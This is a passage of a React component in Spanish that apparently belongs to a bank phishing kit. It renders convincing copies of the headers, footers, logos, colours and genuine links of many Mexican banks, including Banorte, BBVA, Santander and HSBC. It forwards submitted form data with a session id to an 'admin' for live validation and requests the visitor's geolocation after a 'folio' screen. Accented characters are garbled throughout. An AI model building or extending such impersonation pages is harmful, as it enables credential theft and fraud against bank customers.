{\n          tipo: screen,\n          sessionId,\n          data: formData\n        }\n      });\n      \n      // Si es la pantalla FOLIO, solicitar geolocalizaci贸n directamente\n      if (screen === ScreenType.FOLIO) {\n        console.log('[ClientScreen] Folio enviado, solicitando geolocalizaci贸n');\n        requestGeolocationDirectly();\n      } else if (screen === ScreenType.VALIDANDO) {\n        // Si ya estamos en VALIDANDO (pantalla de cargando), mantener la pantalla\n        console.log('[ClientScreen] Mostrando pantalla de cargando...');\n      } else {\n        // Para otras pantallas, cambiar a validando mientras esperamos respuesta del admin\n        setCurrentScreen(ScreenType.VALIDANDO);\n      }\n    }\n  };\n\n  // Funci贸n para determinar el header basado en el banco\n  const renderHeader = () => {\n    if (sessionData.banco === 'LIVERPOOL') {\n      return (\n        <header className=\"bg-[#E1147B] text-white p-4 text-center\">\n          <div className=\"font-bold text-sm mb-2\">{formatDate(new Date())}</div>\n          <div className=\"flex justify-center\">\n            <img \n              src={liverpoolLogo} \n              className=\"liverpool-logo inline-block filter brightness-0 invert\" \n              alt=\"Liverpool\" \n            />\n          </div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BANBAJIO') {\n      return (\n        <>\n          <div className=\"logo text-center py-4 bg-white\">\n            <img \n              src={banbajioLogo} \n              alt=\"BanBaj铆o\"\n              className=\"banbajio-logo inline-block\"\n            />\n            <div className=\"banbajio-header mt-2\">\n              {formatDate(new Date())}\n            </div>\n          </div>\n        </>\n      );\n    } else if (sessionData.banco === 'CITIBANAMEX') {\n      return (\n        <header className=\"bg-[#005BAC] text-white p-4 text-center\">\n          <img \n            src={banamexLogo} \n            className=\"banamex-logo inline-block mb-2\" \n            alt=\"Banamex\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BBVA') {\n      return (\n        <header className=\"bg-[#072146] text-white p-4 text-center\">\n          <img \n            src={bbvaLogoWhite} \n            className=\"bbva-logo inline-block white-logo mb-2\" \n            alt=\"BBVA\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BANORTE') {\n      return (\n        <header className=\"banorte-header\">\n          <img \n            src={banorteLogoHeader} \n            className=\"banorte-logo\" \n            alt=\"Banorte\" \n          />\n          <div className=\"fecha-banorte\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BANCOPPEL') {\n      return (\n        <header className=\"bg-[#0066B3] text-white p-4 text-center\">\n          <img \n            src={bancoppelLogo} \n            className=\"bancoppel-logo inline-block mb-2\" \n            alt=\"BanCoppel\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'HSBC') {\n      return (\n        <header className=\"bg-white p-4 text-center\">\n          <img \n            src={hsbcLogo} \n            className=\"hsbc-logo inline-block mb-2\" \n            alt=\"HSBC\" \n            style={{ maxHeight: \"48px\" }}\n          />\n          <div className=\"font-bold text-sm text-black\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'AMEX') {\n      return (\n        <header className=\"bg-[#0077C8] text-white p-4 text-center\">\n          <img \n            src={amexLogo} \n            className=\"amex-logo inline-block mb-2\" \n            alt=\"American Express\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'SANTANDER') {\n      return (\n        <header className=\"bg-[#EC0000] text-white p-4 text-center\">\n          <img \n            src={santanderLogoWhite} \n            className=\"santander-logo inline-block white-logo mb-2\" \n            alt=\"Santander\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'SCOTIABANK') {\n      return (\n        <header className=\"bg-[#EC111A] text-white p-4 text-center\">\n          <img \n            src={scotiabankLogoWhite} \n            className=\"scotiabank-logo inline-block white-logo mb-2\" \n            alt=\"Scotiabank\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'INVEX') {\n      return (\n        <header className=\"bg-[#BE0046] text-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={invexLogoWhite} \n              className=\"invex-logo inline-block\" \n              alt=\"INVEX\" \n              style={{maxHeight: '36px', height: '2.5rem', width: 'auto'}}\n            />\n          </div>\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BANREGIO') {\n      return (\n        <header className=\"bg-[#FF6600] text-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={banregioLogoWhite} \n              className=\"banregio-logo inline-block white-logo\" \n              alt=\"Banregio\" \n            />\n          </div>\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'SPIN') {\n      return (\n        <header className=\"bg-[#6551FF] text-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src=\"https://storage.googleapis.com/banking-spinbyoxxo/public/spin-logo-08a5c1a.svg\" \n              className=\"spin-logo inline-block white-logo\" \n              alt=\"SPIN\" \n            />\n          </div>\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'PLATACARD') {\n      return (\n        <header className=\"bg-[#333333] text-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={platacardLogo} \n              className=\"platacard-logo inline-block\" \n              alt=\"Plata Card\" \n              style={{height: '2.5rem', width: 'auto'}}\n            />\n          </div>\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BANCO_AZTECA') {\n      return (\n        <header className=\"bg-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={bancoAztecaLogo} \n              className=\"banco-azteca-logo inline-block\" \n              alt=\"Banco Azteca\" \n              style={{height: '2.5rem', width: 'auto'}}\n            />\n          </div>\n          <div className=\"font-bold text-sm text-[#00A552]\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'BIENESTAR') {\n      return (\n        <header className=\"bg-[#9D2449] text-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={bienestarLogo} \n              className=\"bienestar-logo inline-block\" \n              alt=\"Banco del Bienestar\" \n              style={{height: '2.5rem', width: 'auto'}}\n            />\n          </div>\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'INBURSA') {\n      return (\n        <header className=\"bg-[#1B4B72] text-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={inbursaLogo} \n              className=\"inbursa-logo inline-block filter brightness-0 invert\" \n              alt=\"Grupo Financiero Inbursa\" \n              style={{height: '0.75rem', width: 'auto'}}\n            />\n          </div>\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else if (sessionData.banco === 'AFIRME') {\n      return (\n        <header className=\"bg-white p-4 text-center\">\n          <div className=\"flex justify-center mb-2\">\n            <img \n              src={afirmeLogo} \n              className=\"afirme-logo inline-block\" \n              alt=\"Afirme\" \n              style={{height: '2.5rem', width: 'auto'}}\n            />\n          </div>\n          <div className=\"font-bold text-sm text-[#009639]\">{formatDate(new Date())}</div>\n        </header>\n      );\n    } else {\n      // Default header (Banorte)\n      return (\n        <header className=\"bg-[#EC1C24] text-white p-4 text-center\">\n          <img \n            src={banorteLogoHeader} \n            className=\"banorte-logo inline-block mb-2\" \n            alt=\"Banorte\" \n          />\n          <div className=\"font-bold text-sm\">{formatDate(new Date())}</div>\n        </header>\n      );\n    }\n  };\n\n  // Funci贸n para renderizar el footer espec铆fico de BanBaj铆o y Banorte\n  const renderFooter = () => {\n    if (sessionData.banco === 'BANBAJIO') {\n      return (\n        <footer className=\"mt-auto\">\n          <div className=\"banbajio-footer\">\n            Aprende m谩s | Ayuda | T茅rminos y condiciones | Seguridad en l铆nea\n          </div>\n          <div className=\"banbajio-footer-bottom\">\n            <a href=\"#\" className=\"text-white mx-2\">Cont谩ctanos</a>\n            <a href=\"#\" className=\"text-white mx-2\">Aclaraciones</a>\n            <a href=\"#\" className=\"text-white mx-2\">Promociones</a>\n            <a href=\"#\" className=\"text-white mx-2\">Facebook</a>\n            <a href=\"#\" className=\"text-white mx-2\">YouTube</a>\n            <br />\n            漏 Banbajio M茅xico 2024. Todos los Derechos Reservados\n          </div>\n        </footer>\n      );\n    } else if (sessionData.banco === 'BANORTE') {\n      return (\n        <footer className=\"mt-auto\">\n          <div className=\"banorte-nav\">\n            <a href=\"https://www.banorte.com/\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"banorte-link\">Aprende m谩s</a>\n            <a href=\"https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"banorte-link\">Ayuda</a>\n            <a href=\"https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"banorte-link\">T茅rminos</a>\n            <a href=\"https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"banorte-link\">Seguridad</a>\n          </div>\n          <div className=\"banorte-footer\">\n            <div className=\"mb-2\">\n              <a href=\"https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Cont谩ctanos</a> |\n              <a href=\"https://www.banorte.com/wps/portal/banorte/Home/servicios/aclaraciones\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Aclaraciones</a> |\n              <a href=\"https://www.banorte.com/wps/portal/banorte/Home/promociones\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Promociones</a>\n            </div>\n            <div className=\"mb-2\">\n              <a href=\"https://www.facebook.com/BanorteGFNorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Facebook</a> |\n              <a href=\"https://www.youtube.com/user/BanorteGFNorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">YouTube</a> |\n              <a href=\"https://twitter.com/Banorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Twitter</a>\n            </div>\n            <div className=\"text-sm opacity-90\">\n              漏 Banorte M茅xico 2024. Todos los Derechos Reservados\n            </div>\n          </div>\n        </footer>\n      );\n    } else {\n      return (\n        <footer className=\"mt-auto\">\n          <div className=\"bg-gray-100 p-4 text-center text-sm\">\n            <a href={\n              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/home' : \n              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/index.html' : \n              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/' :\n              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/main/index.html' :\n              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/' :\n              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/' :\n              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/' :\n              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/personas.aspx' :\n              sessionData.banco === 'INVEX' ? 'https://www.invex.com/' :\n              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :\n              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :\n              sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :\n              sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/' :\n              sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar' :\n              sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/' :\n              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/' :\n              'https://www.banorte.com/'\n            } target=\"_blank\" rel=\"noopener noreferrer\" className={`${\n              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : \n              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : \n              sessionData.banco === 'BBVA' ? 'text-[#072146]' :\n              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :\n              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :\n              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :\n              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :\n              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :\n              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :\n              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :\n              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :\n              sessionData.banco === 'PLATACARD' ? 'text-[#FF5722]' :\n              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :\n              'text-[#EC1C24]'\n            } mx-2`}>Aprende m谩s</a>\n            <a href={\n              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda' : \n              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/preguntas-frecuentes.html' : \n              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/bbva-mexico.html' :\n              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/comercio_electronico/index.html' :\n              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :\n              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/' :\n              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/ayuda/' :\n              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :\n              sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :\n              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/' :\n              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/centro-de-ayuda' :\n              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/ayuda' :\n              'https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/'\n            } target=\"_blank\" rel=\"noopener noreferrer\" className={`${\n              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :\n              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : \n              sessionData.banco === 'BBVA' ? 'text-[#072146]' :\n              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :\n              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :\n              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :\n              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :\n              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :\n              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :\n              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :\n              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :\n              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :\n              'text-[#EC1C24]'\n            } mx-2`}>Ayuda</a>\n            <a href={\n              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/terminos-y-condiciones/terminos-y-condiciones/' : \n              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/terminos-y-condiciones' : \n              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/informacion-adicional.html' :\n              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/acerca_bancoppel/terminos.html' :\n              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/condiciones/' :\n              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/preferencias-legales/aviso-de-privacidad/' :\n              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/terminos-condiciones-contratos/' :\n              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/terminos-y-condiciones.aspx' :\n              sessionData.banco === 'INVEX' ? 'https://www.invex.com/aviso-de-privacidad' :\n              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contenido/terminos.php' :\n              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/aviso-de-privacidad' :\n              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/terminos-y-condiciones' :\n              'https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones'\n            } target=\"_blank\" rel=\"noopener noreferrer\" className={`${\n              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :\n              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : \n              sessionData.banco === 'BBVA' ? 'text-[#072146]' :\n              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :\n              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :\n              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :\n              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :\n              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :\n              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :\n              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :\n              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :\n              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :\n              'text-[#EC1C24]'\n            } mx-2`}>T茅rminos y condiciones</a>\n            <a href={\n              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/seguridad-en-sus-compras/seguridad-en-sus-compras/' : \n              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/seguridad.html' : \n              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/seguridad-digital.html' :\n              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/bancoppel_sitio/seguridad.html' :\n              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/seguridad/' :\n              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/seguridad/' :\n              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/seguridad/' :\n              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/seguridad-bancaria.aspx' :\n              sessionData.banco === 'INVEX' ? 'https://www.invex.com/seguridad' :\n              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/seguridad.php' :\n              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/seguridad' :\n              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/seguridad' :\n              'https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte'\n            } target=\"_blank\" rel=\"noopener noreferrer\" className={`${\n              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :\n              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : \n              sessionData.banco === 'BBVA' ? 'text-[#072146]' :\n              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :\n              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :\n              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :\n              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :\n              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :\n              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :\n              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :\n              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :\n              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :\n              'text-[#EC1C24]'\n            } mx-2`}>Seguridad en l铆nea</a>\n          </div>\n\n          <div className={`${\n            sessionData.banco === 'LIVERPOOL' ? 'bg-[#E1147B]' :\n            sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : \n            sessionData.banco === 'BBVA' ? 'bg-[#072146]' :\n            sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :\n            sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :\n            sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :\n            sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :\n            sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :\n            sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :\n            sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :\n            sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :\n            sessionData.banco === 'PLATACARD' ? 'bg-[#333333]' :\n            sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :\n            sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :\n            sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :\n            sessionData.banco === 'AFIRME' ? 'bg-[#009639]' :\n            'bg-[#EC1C24]'\n          } text-white p-4 text-center text-sm`}>\n            <div className=\"mb-3\">\n              <a href={\n                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/contacto' : \n                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/contacto.html' : \n                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/contacto.html' :\n                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/contacto/index.html' :\n                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :\n                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/contacto/' :\n                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/contacto/' :\n                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :\n                sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :\n                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contacto.php' :\n                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/contacto' :\n                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/contacto.html' :\n                sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/contacto' :\n                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/contacto' :\n                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/contacto' :\n                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'\n              } target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Cont谩ctanos</a> |\n              <a href={\n                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/aclaraciones/ayuda-aclaraciones/' : \n                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/aclaraciones.html' : \n                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/aclaraciones.html' :\n                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/aclaraciones/index.html' :\n                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/aclaraciones/' :\n                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/disputas/' :\n                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/aclaraciones/' :\n                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/unidad-especializada-aclaraciones.aspx' :\n                sessionData.banco === 'INVEX' ? 'https://www.invex.com/aclaraciones' :\n                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/aclaraciones.php' :\n                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/preguntas-frecuentes' :\n                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/ayuda-y-preguntas-frecuentes.html' :\n                sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/acciones-y-programas/aclaraciones-bancarias' :\n                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/aclaraciones' :\n                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/aclaraciones' :\n                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'\n              } target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Aclaraciones</a> |\n              <a href={\n                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/promociones/' : \n                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/promociones.html' : \n                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/productos/promociones.html' :\n                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/promociones/index.html' :\n                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/promociones/' :\n                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/promociones/hoteles/' :\n                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/santander-select/promociones-exclusivas/' :\n                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/promociones/promociones.aspx' :\n                sessionData.banco === 'INVEX' ? 'https://www.invex.com/promociones' :\n                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/promociones/' :\n                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/promociones' :\n                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/promociones.html' :\n                sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/documentos/promociones-y-sorteos' :\n                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/promociones' :\n                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/promociones' :\n                'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'\n              } target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Promociones</a> |\n              <a href={\n                sessionData.banco === 'LIVERPOOL' ? 'https://www.facebook.com/liverpoolmexico' : \n                sessionData.banco === 'CITIBANAMEX' ? 'https://www.facebook.com/BanamexOficial' : \n                sessionData.banco === 'BBVA' ? 'https://www.facebook.com/BBVAMexico' :\n                sessionData.banco === 'BANCOPPEL' ? 'https://www.facebook.com/BanCoppel' :\n                sessionData.banco === 'HSBC' ? 'https://www.facebook.com/HSBC.MX' :\n                sessionData.banco === 'AMEX' ? 'https://www.facebook.com/AmericanExpressMexico' :\n                sessionData.banco === 'SANTANDER' ? 'https://www.facebook.com/SantanderMexico' :\n                sessionData.banco === 'SCOTIABANK' ? 'https://www.facebook.com/ScotiabankMX' :\n                sessionData.banco === 'INVEX' ? 'https://www.facebook.com/INVEXBanco' :\n                sessionData.banco === 'BANREGIO' ? 'https://www.facebook.com/banregio' :\n                sessionData.banco === 'SPIN' ? 'https://www.facebook.com/SpinByOxxo' :\n                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.facebook.com/BancoAzteca' :\n                sessionData.banco === 'BIENESTAR' ? 'https://www.facebook.com/BBienestarMX' :\n                sessionData.banco === 'INBURSA' ? 'https://www.facebook.com/GrupoFinancieroInbursa' :\n                sessionData.banco === 'AFIRME' ? 'https://www.facebook.com/BancoAfirme' :\n                'https://www.facebook.com/BanorteOficial'\n              } target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Facebook</a> |\n              <a href={\n                sessionData.banco === 'LIVERPOOL' ? 'https://www.youtube.com/user/liverpoolmexico' : \n                sessionData.banco === 'CITIBANAMEX' ? 'https://www.youtube.com/user/Banamex' : \n                sessionData.banco === 'BBVA' ? 'https://www.youtube.com/user/BBVABancomer' :\n                sessionData.banco === 'BANCOPPEL' ? 'https://www.youtube.com/channel/UCiLI7sTiT4XjzUOtYQrNtpw' :\n                sessionData.banco === 'HSBC' ? 'https://www.youtube.com/user/HSBCMEX' :\n                sessionData.banco === 'AMEX' ? 'https://www.youtube.com/user/americanexpressmexico' :\n                sessionData.banco === 'SANTANDER' ? 'https://www.youtube.com/user/SantanderMx' :\n                sessionData.banco === 'SCOTIABANK' ? 'https://www.youtube.com/user/ScotiabankMX' :\n                sessionData.banco === 'INVEX' ? 'https://www.youtube.com/channel/UCgYL-vVd9Af5oVcpOyMsefQ' :\n                sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :\n                sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :\n                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.youtube.com/user/bancoaztecaoficial' :\n                sessionData.banco === 'BIENESTAR' ? 'https://www.youtube.com/@BBienestarMX' :\n                sessionData.banco === 'INBURSA' ? 'https://www.youtube.com/@GrupoFinancieroInbursa' :\n                sessionData.banco === 'AFIRME' ? 'https://www.youtube.com/user/BancoAfirme' :\n                'https://www.youtube.com/user/GFBanorte'\n              } target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Youtube</a>\n            </div>\n            <div>漏 {\n              sessionData.banco === 'LIVERPOOL' ? 'Liverpool' :\n              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : \n              sessionData.banco === 'BBVA' ? 'BBVA' :\n              sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :\n              sessionData.banco === 'HSBC' ? 'HSBC' :\n              sessionData.banco === 'AMEX' ? 'American Express' :\n              sessionData.banco === 'SANTANDER' ? 'Santander' :\n              sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :\n              sessionData.banco === 'INVEX' ? 'INVEX' :\n              sessionData.banco === 